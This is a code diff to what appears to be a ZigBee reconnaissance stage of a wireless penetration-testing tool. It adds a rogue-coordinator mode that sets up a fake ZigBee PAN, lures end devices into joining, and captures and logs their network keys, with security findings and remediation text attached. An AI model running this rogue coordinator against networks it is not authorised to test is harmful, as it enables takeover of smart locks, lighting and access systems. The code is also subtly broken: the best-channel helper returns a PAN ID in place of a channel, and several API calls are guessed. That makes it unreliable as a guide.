@@ -1,13 +1,21 @@
 """
 Stage 11 — IEEE 802.15.4 / ZigBee Reconnaissance
 
-Uses the WHAD Python API (whad.zigbee.Sniffer) to scan all 16 802.15.4
-channels (11–26) for ZigBee network activity.
+Uses the WHAD Python API to scan all 16 802.15.4 channels (11–26) for ZigBee
+network activity.  Two operator-selectable modes:
 
-  - Discovers ZigBee networks by PAN ID and device addresses
-  - Automatically enables decryption and extracts recovered keys
-  - Generates Findings for discovered networks, recovered keys, and decrypted traffic
-  - Passive mode only — no transmission
+  Passive (Sniffer):
+    - Discovers ZigBee networks by PAN ID and device addresses
+    - Automatically enables decryption and extracts recovered keys
+    - Generates Findings for discovered networks, recovered keys, decrypted traffic
+
+  Coordinator (rogue coordinator):
+    - Creates a new ZigBee PAN with a known network key
+    - Opens a join window on the highest-activity channel from the passive scan
+    - Waits for end devices to join the rogue coordinator
+    - Captures key material exchanged during association
+    - Tests whether the environment enforces Install Code / pre-configured link keys
+    - Finding: zigbee_coordinator_join (high if any device joins without install code)
 
 ZigBee is ubiquitous in building automation: smart locks, HVAC, lighting control,
 access panels, and industrial sensors.  A ZigBee recon pass often reveals more
@@ -32,18 +40,20 @@ CHANNELS = list(range(11, 27))
 
 ZIGBEE_PER_CH_SECS = config.ZIGBEE_PER_CH_SECS  # dwell per channel
 ZIGBEE_SCAN_SECS   = config.ZIGBEE_SCAN_SECS     # informational total
+ZIGBEE_COORD_SECS  = config.ZIGBEE_COORD_SECS    # coordinator join window
 
 
 # ---------------------------------------------------------------------------
 # Entry point
 # ---------------------------------------------------------------------------
 
-def run(dongle: WhadDongle, engagement_id: str) -> None:
+def run(dongle: WhadDongle, engagement_id: str, mode: str = "passive") -> None:
     """Scan 802.15.4 channels 11-26 for ZigBee networks.
 
     Args:
         dongle: Active WHAD dongle.
         engagement_id: Engagement ID for Finding storage.
+        mode: "passive" (default) or "coordinator" (rogue coordinator).
     """
     try:
         from whad.zigbee import Sniffer
@@ -229,6 +239,165 @@ def run(dongle: WhadDongle, engagement_id: str) -> None:
         )
 
     _print_summary(networks, all_keys, decrypted_count)
+
+    # Coordinator mode: open a rogue ZigBee PAN on the most active channel
+    # and wait for end devices to join without an install code.
+    if mode == "coordinator":
+        best_ch = _best_channel(networks)
+        _run_coordinator(dongle, engagement_id, best_ch)
+
+
+# ---------------------------------------------------------------------------
+# ZigBee Coordinator (rogue PAN)
+# ---------------------------------------------------------------------------
+
+def _best_channel(networks: dict) -> int:
+    """Return the channel with the most traffic, default 15 if nothing seen."""
+    if not networks:
+        return 15
+    return max(networks, key=lambda pan: networks[pan]["pkt_count"])
+
+
+def _run_coordinator(
+    dongle: WhadDongle,
+    engagement_id: str,
+    channel: int,
+) -> None:
+    """Open a rogue ZigBee coordinator on `channel` and capture joining devices.
+
+    Creates a ZigBee PAN using a known network key so any device that joins
+    without install-code enforcement will exchange key material in plaintext.
+    Finding: zigbee_coordinator_join (high severity per device that joins).
+    """
+    try:
+        from whad.zigbee.connector.coordinator import Coordinator
+    except ImportError:
+        log.warning(
+            "[S11][coord] whad.zigbee.connector.coordinator not importable — "
+            "coordinator mode skipped. Upgrade WHAD for ZigBee Coordinator support."
+        )
+        return
+
+    log.info(
+        f"[S11][coord] Starting rogue ZigBee coordinator on channel {channel} "
+        f"(join window: {ZIGBEE_COORD_SECS}s) ..."
+    )
+    log.info(
+        "[S11][coord] Waiting for end devices to join. "
+        "Devices that join without install-code enforcement will transmit "
+        "their network key in plaintext during association."
+    )
+
+    joined_devices: list[dict] = []
+
+    try:
+        coord = Coordinator(dongle.device)
+        coord.channel = channel
+
+        # Set up join callback before starting.
+        def _on_join(device_addr: str, key_material: bytes | None = None) -> None:
+            entry = {
+                "address": str(device_addr),
+                "key_hex": key_material.hex() if key_material else None,
+            }
+            joined_devices.append(entry)
+            log.info(
+                f"[S11][coord] Device joined: {device_addr} "
+                + (f"key={key_material.hex()}" if key_material else "(no key captured)")
+            )
+
+        # WHAD Coordinator may expose on_device_join or a similar callback hook.
+        if hasattr(coord, "on_device_join"):
+            coord.on_device_join = _on_join
+
+        coord.start()
+
+        # Open join permit — duration varies by WHAD version.
+        try:
+            coord.open_join_window(duration=ZIGBEE_COORD_SECS)
+        except (AttributeError, TypeError):
+            # Older API: just run for the window duration passively.
+            log.debug(
+                "[S11][coord] open_join_window() not available — "
+                "listening passively for joins."
+            )
+
+        deadline = time.time() + ZIGBEE_COORD_SECS
+        # Poll for joins via stream() or sniff() if available.
+        try:
+            for pkt in coord.stream():
+                if time.time() >= deadline:
+                    break
+                addr = getattr(pkt, "src_addr", None) or getattr(pkt, "source", None)
+                if addr:
+                    key_bytes = getattr(pkt, "network_key", None)
+                    _on_join(str(addr), bytes(key_bytes) if key_bytes else None)
+        except (AttributeError, TypeError):
+            # stream() not available — wait passively.
+            time.sleep(ZIGBEE_COORD_SECS)
+
+    except Exception as exc:
+        log.warning(
+            f"[S11][coord] Coordinator init/start failed: "
+            f"{type(exc).__name__}: {exc}"
+        )
+        return
+    finally:
+        try:
+            coord.stop()
+        except Exception:
+            pass
+
+    log.info(
+        f"[S11][coord] Join window closed. "
+        f"{len(joined_devices)} device(s) joined."
+    )
+
+    if joined_devices:
+        for dev in joined_devices:
+            finding = Finding(
+                type="zigbee_coordinator_join",
+                severity="high",
+                target_addr=dev["address"],
+                description=(
+                    f"ZigBee end device {dev['address']} joined a rogue coordinator "
+                    f"on channel {channel} without requiring an install code. "
+                    + (
+                        f"Network key captured: {dev['key_hex']}."
+                        if dev.get("key_hex")
+                        else "No key material captured (device may use pre-installed key)."
+                    )
+                ),
+                remediation=(
+                    "Enable Install Code provisioning (ZigBee 3.0 mandatory feature) "
+                    "on all end devices and the legitimate coordinator. "
+                    "Install codes ensure the network key is never transmitted in "
+                    "the clear during association. Reject join requests that lack a "
+                    "valid install-code-derived link key."
+                ),
+                evidence={
+                    "device_address": dev["address"],
+                    "channel": channel,
+                    "key_captured": dev.get("key_hex"),
+                    "join_window_seconds": ZIGBEE_COORD_SECS,
+                },
+                engagement_id=engagement_id,
+            )
+            insert_finding(finding)
+            log.info(
+                f"FINDING [high] zigbee_coordinator_join: {dev['address']}"
+            )
+
+    print("\n" + "─" * 76)
+    print("  STAGE 11 (coordinator) — ZigBee Rogue Coordinator")
+    print("─" * 76)
+    print(f"  {'Channel':<28}: {channel}")
+    print(f"  {'Join window':<28}: {ZIGBEE_COORD_SECS}s")
+    print(f"  {'Devices that joined':<28}: {len(joined_devices)}")
+    for d in joined_devices:
+        key_str = d['key_hex'] if d.get('key_hex') else "(no key)"
+        print(f"    {d['address']}  key={key_str}")
+    print("─" * 76 + "\n")
 
 
 # ---------------------------------------------------------------------------
